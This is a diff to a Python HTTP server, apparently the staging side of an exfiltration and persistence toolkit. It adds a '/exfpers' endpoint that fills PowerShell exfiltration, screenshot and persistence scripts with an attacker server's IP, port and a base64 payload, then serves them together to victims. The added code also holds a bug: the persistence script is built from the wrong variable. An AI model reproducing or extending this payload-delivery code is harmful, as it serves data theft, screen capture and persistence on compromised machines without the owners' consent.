@@ -46,6 +46,29 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] Error while sending files.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
+        elif self.path == '/exfpers':
+            try:
+                file_to_open = open('scripts/client_exf.ps1','r').read()
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
+                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
+                file_to_open2 = open('scripts/client_pers.ps1','r').read()
+                file_to_open2 = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
+                file_to_open3 = open('scripts/client_screen.ps1','r').read()
+                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
+                file_to_open3 = file_to_open3.replace('SERVER_PROTOCOL',PROTOCOL)
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8')+bytes(file_to_open3, 'utf-8')+bytes(file_to_open2, 'utf-8'))
+                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+            except:
+                log('[-] Error while sending files.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
         elif self.path == '/exf':
             try:
                 file_to_open = open('scripts/client_exf.ps1','r').read()
